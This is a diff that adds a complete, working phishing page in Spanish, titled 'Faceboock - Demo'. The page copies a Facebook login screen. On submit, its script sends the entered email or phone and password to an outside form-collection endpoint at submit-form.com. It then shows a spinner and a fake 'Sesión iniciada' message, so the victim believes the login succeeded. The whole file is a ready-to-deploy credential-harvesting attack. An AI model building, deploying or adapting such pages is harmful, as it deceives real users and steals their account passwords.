@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Faceboock - Demo</title>
+
+<style>
+body{
+  margin:0;
+  font-family: Helvetica, Arial, sans-serif;
+  background:#f0f2f5;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+}
+
+.container{
+  width:90%;
+  max-width:360px;
+  text-align:center;
+  background:#fff;
+  padding:20px 15px;
+  border-radius:12px;
+  box-shadow:0 4px 12px rgba(0,0,0,0.1);
+}
+
+.logo-circle{
+  width:60px;
+  height:60px;
+  background:#1877f2;
+  border-radius:50%;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  margin:20px auto;
+  font-size:32px;
+  color:#fff;
+  font-weight:bold;
+}
+
+input{
+  width:100%;
+  padding:14px;
+  margin:8px 0;
+  border-radius:8px;
+  border:1px solid #dddfe2;
+  font-size:16px;
+  box-sizing:border-box;
+}
+
+button{
+  width:100%;
+  padding:14px;
+  margin-top:10px;
+  border:none;
+  border-radius:8px;
+  background:#1877f2;
+  color:white;
+  font-size:17px;
+  font-weight:bold;
+}
+
+.link{
+  margin-top:15px;
+  font-size:14px;
+  color:#1877f2;
+}
+
+.footer-btn{
+  margin-top:20px;
+  padding:14px;
+  border-radius:8px;
+  background:#42b72a;
+  color:white;
+  font-size:16px;
+  font-weight:bold;
+}
+
+.warning{
+  font-size:12px;
+  color:gray;
+  margin-top:15px;
+}
+
+.loading{
+  display:none;
+  text-align:center;
+}
+
+.spinner{
+  border:4px solid #f3f3f3;
+  border-top:4px solid #1877f2;
+  border-radius:50%;
+  width:40px;
+  height:40px;
+  animation:spin 1s linear infinite;
+  margin:20px auto;
+}
+
+@keyframes spin{
+  0%{ transform:rotate(0deg); }
+  100%{ transform:rotate(360deg); }
+}
+</style>
+</head>
+
+<body>
+
+<div class="container" id="formContainer">
+
+<div class="logo-circle">F</div>
+
+<form id="miForm">
+  <input type="text" name="usuario" placeholder="Correo o teléfono" required>
+  <input type="password" name="password" placeholder="Contraseña" required>
+  <button type="submit">Iniciar sesión</button>
+</form>
+
+<div class="link">¿Olvidaste tu contraseña?</div>
+<div class="footer-btn">Crear cuenta nueva</div>
+
+<div class="warning">
+  
+</div>
+
+</div>
+
+<div class="loading" id="loadingScreen">
+  <div class="spinner"></div>
+  <p>Cargando...</p>
+</div>
+
+<script>
+document.getElementById("miForm").addEventListener("submit", function(e){
+  e.preventDefault();
+
+  document.getElementById("formContainer").style.display = "none";
+  document.getElementById("loadingScreen").style.display = "block";
+
+  const data = new FormData(this);
+
+  // 🔹 URL actualizada con tu nuevo formulario Formspark 🔹
+  fetch("https://submit-form.com/form_v1_UmuMhG6aZ4y1ht0QylaGSOHx", {
+    method: "POST",
+    body: data
+  }).then(() => {
+    setTimeout(() => {
+      document.getElementById("loadingScreen").innerHTML = "<h3>Sesión iniciada </h3>";
+    }, 2000);
+  }).catch(() => {
+    alert("Error al enviar");
+  });
+});
+</script>
+
+</body>
+</html>
